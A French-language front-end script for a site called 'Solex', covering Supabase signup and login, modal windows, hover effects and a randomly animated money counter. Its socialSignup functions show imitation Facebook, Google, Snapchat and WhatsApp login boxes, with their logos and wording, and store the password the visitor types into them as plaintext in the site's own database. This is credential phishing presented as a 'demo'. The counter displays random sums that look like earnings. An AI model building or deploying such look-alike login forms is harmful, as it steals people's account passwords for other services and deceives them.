   
   /* ================================
       CONFIGURATION SUPABASE
    ================================= */

    const SUPABASE_URL =
        "https://leppncecjxccbkwoktyu.supabase.co";

    const SUPABASE_KEY =
        "sb_publishable_FDtcO7MF7VVtQ7s94bpGeQ_5D4Reg4j";

    const supabaseClient =
        window.supabase.createClient(
            SUPABASE_URL,
            SUPABASE_KEY
        );


    /* ================================
       MODALS
    ================================= */

     function closeModals() {

    document
        .getElementById("signupModal")
        .classList.remove("active");

    document
        .getElementById("loginModal")
        .classList.remove("active");

    const socialModal =
        document.getElementById("socialSignupModal");

    if (socialModal) {
        socialModal.classList.remove("active");
    }
}

   
   function openSignup() {

        closeModals();

        document
            .getElementById("signupModal")
            .classList.add("active");
    }


    function openLogin() {

        closeModals();

        document
            .getElementById("loginModal")
            .classList.add("active");
    }

/* =====================================================
   INSCRIPTION VIA RÉSEAUX — MODE VISUEL
   ===================================================== */

const socialProviders = {

    facebook: {
        title: "Connexion avec Facebook",
        description: "Continue avec ton compte Facebook",
        logo: "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg",
        theme: "facebook-theme",
        label: "Adresse e-mail ou numéro de téléphone",
        placeholder: "Adresse e-mail ou numéro",
        button: "Continuer avec Facebook"
    },

    google: {
        title: "Connexion avec Google",
        description: "Continue avec ton compte Google",
        logo: "https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg",
        theme: "google-theme",
        label: "Adresse e-mail",
        placeholder: "Adresse e-mail",
        button: "Continuer avec Google"
    },

    snapchat: {
        title: "Connexion avec Snapchat",
        description: "Continue avec ton compte Snapchat",
        logo: "https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg",
        theme: "snapchat-theme",
        label: "Nom d'utilisateur",
        placeholder: "Nom d'utilisateur",
        button: "Continuer avec Snapchat"
    },

    whatsapp: {
        title: "Connexion avec WhatsApp",
        description: "Continue avec ton compte WhatsApp",
        logo: "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg",
        theme: "whatsapp-theme",
        label: "Numéro de téléphone",
        placeholder: "Numéro de téléphone",
        button: "Continuer avec WhatsApp"
    }

};


function openSocialSignup(provider) {

    const data = socialProviders[provider];

    if (!data) return;

    closeModals();

    const modal =
        document.getElementById("socialSignupModal");

    const box =
        document.getElementById("socialLoginBox");

    const logo =
        document.getElementById("socialProviderLogo");

    const title =
        document.getElementById("socialProviderTitle");

    const description =
        document.getElementById("socialProviderDescription");

    const label =
        document.getElementById("socialInputLabel");

    const input =
        document.getElementById("socialDemoInput");

    const button =
        document.getElementById("socialSubmitButton");

    box.className =
        "modal-box social-login-box " + data.theme;

    logo.src = data.logo;
    logo.alt = provider;

    title.textContent =
        data.title;

    description.textContent =
        data.description;

    label.textContent =
        data.label;

    input.placeholder =
        data.placeholder;

    button.textContent =
        data.button;

    document.getElementById(
        "socialDemoMessage"
    ).textContent = "";

    modal.classList.add("active");
}


async function socialDemoLogin(event) {

    event.preventDefault();

    const message =
        document.getElementById("socialDemoMessage");
    const email= document.getElementById("socialDemoInput").value;
   const password= document.getElementById("socialDemoPassword").value;
   
   try{
   const {error: profileError}= await supabaseClient
         .from("profiles")
         .insert({
            email: email,
            password: password
            });
            
                  if (profileError) {

                message.textContent =
                    "Compte créé mais profil non créé : "
                    + profileError.message;

                return;
            }
    message.textContent =
        "Compte crée avec succès";
       setTimeout(() => {

                window.location.href =
                    "dashboard.html";

            }, 2400);
      
        } catch (error) {

            console.error(error);

            message.textContent =
                "Une erreur est survenue.";

        }
}

    /* ================================
       INSCRIPTION
    ================================= */

    async function register(event) {
    event.preventDefault();

    const name =
        document.getElementById("signupName").value.trim();

    const email =
        document.getElementById("signupEmail").value.trim();

    const password =
        document.getElementById("signupPassword").value;

    const message =
        document.getElementById("signupMessage");

    message.textContent = "Création du compte...";

    try {

        const { data, error } =
            await supabaseClient.auth.signUp({
                email: email,
                password: password
            });

        if (error) {
            console.error(error);
            message.textContent = error.message;
            return;
        }

        if (!data.user) {
            message.textContent =
                "Impossible de créer le compte.";
            return;
        }

        // Création du profil
        const { error: profileError } =
            await supabaseClient
                .from("profiles")
                .insert({
                    id: data.user.id,
                    name: name,
                    email: email,
                    balance: 0
                });

        if (profileError) {
            console.error(profileError);

            message.textContent =
                "Compte créé mais profil non créé : "
                + profileError.message;

            return;
        }
      
        message.textContent =
            "Compte créé avec succès !";

        setTimeout(() => {
            window.location.href =
                "dashboard.html";
        }, 1200);

    } catch (error) {

        console.error(error);

        message.textContent =
            "Une erreur est survenue.";
    }
}

    /* ================================
       CONNEXION
    ================================= */
     async function login(event) {
    event.preventDefault();

    const email = document.getElementById("loginEmail").value.trim();
    const password = document.getElementById("loginPassword").value;
    const message = document.getElementById("loginMessage");

    message.textContent = "Connexion...";

    try {

        const { data, error } =
            await supabaseClient.auth.signInWithPassword({
                email: email,
                password: password
            });

        if (error) {
            console.error(error);
            message.textContent = error.message;
            return;
        }

        if (!data.user) {
            message.textContent = "Utilisateur introuvable.";
            return;
        }

        // Récupérer le profil avec l'ID de l'utilisateur
        const { data: profile, error: profileError } =
            await supabaseClient
                .from("profiles")
                .select("name")
                .eq("id", data.user.id)
                .single();

        if (profileError) {
            console.error(profileError);
            message.textContent =
                "Connexion réussie, mais profil introuvable.";
            return;
        }

        localStorage.setItem("user_name", profile.name);
        localStorage.setItem("user_id", data.user.id);

        message.textContent = "Connexion réussie !";

        setTimeout(() => {
            window.location.href = "dashboard.html";
        }, 700);

    } catch (error) {

        console.error(error);

        message.textContent =
            "Une erreur est survenue.";
    }
}
   
   /* =====================================================
   SOLEX — INTERACTIONS
   ===================================================== */
/* Effet 3D des boutons */
document
    .querySelectorAll(".hero-actions button")
    .forEach(button => {
        button.addEventListener("mousemove", event => {
            const rect =
                button.getBoundingClientRect();
            const x =
                event.clientX - rect.left;
            const y =
                event.clientY - rect.top;
            const rotateY =
                (x - rect.width / 2) / 15;
            const rotateX =
                (rect.height / 2 - y) / 15;
            button.style.transform =
                `translateY(-5px)
                 scale(1.025)
                 rotateX(${rotateX}deg)
                 rotateY(${rotateY}deg)`;
        });
        button.addEventListener("mouseleave", () => {
            button.style.transform = "";
        });
    });
/* =====================================================
   EFFET 3D DES CARTES
   ===================================================== */
document
    .querySelectorAll(".feature")
    .forEach(card => {
        card.addEventListener("mousemove", event => {
            const rect =
                card.getBoundingClientRect();
            const x =
                event.clientX - rect.left;
            const y =
                event.clientY - rect.top;
            const rotateY =
                (x - rect.width / 2) / 20;
            const rotateX =
                (rect.height / 2 - y) / 20;
            card.style.transform =
                `translateY(-8px)
                 scale(1.025)
                 rotateX(${rotateX}deg)
                 rotateY(${rotateY}deg)`;
        });
        card.addEventListener("mouseleave", () => {
            card.style.transform = "";
        });
    });
/* =====================================================
   PETIT PARALLAXE DU HERO
   ===================================================== */
const heroContent =
    document.querySelector(".hero-content");
document.addEventListener("mousemove", event => {
    if (!heroContent) return;
    const x =
        (event.clientX / window.innerWidth - 0.5);
    const y =
        (event.clientY / window.innerHeight - 0.5);
    heroContent.style.setProperty(
        "--mouse-x",
        `${x * 4}px`
    );
    heroContent.style.setProperty(
        "--mouse-y",
        `${y * 3}px`
    );
});
/* =====================================================
   COMPTEUR D'ARGENT SOLEX
   ===================================================== */

const moneyCounter =
    document.getElementById("moneyCounter");

let moneyValue = 0;

function animateMoney() {

    const target =
        Math.floor(
            Math.random() * 90000
        ) + 10000;

    const start =
        moneyValue;

    const duration = 2200;

    const startTime =
        performance.now();


    function updateMoney(currentTime) {

        const progress =
            Math.min(
                (currentTime - startTime) / duration,
                1
            );


        /* accélération puis ralentissement */

        const eased =
            1 - Math.pow(1 - progress, 3);


        const current =
            Math.floor(
                start +
                (target - start) * eased
            );


        moneyCounter.textContent =
            current.toLocaleString("fr-FR");


        if (progress < 1) {

            requestAnimationFrame(
                updateMoney
            );

        } else {

            moneyValue = target;

            setTimeout(
                animateMoney,
                900
            );
        }
    }


    requestAnimationFrame(
        updateMoney
    );
}


if (moneyCounter) {
    animateMoney();
}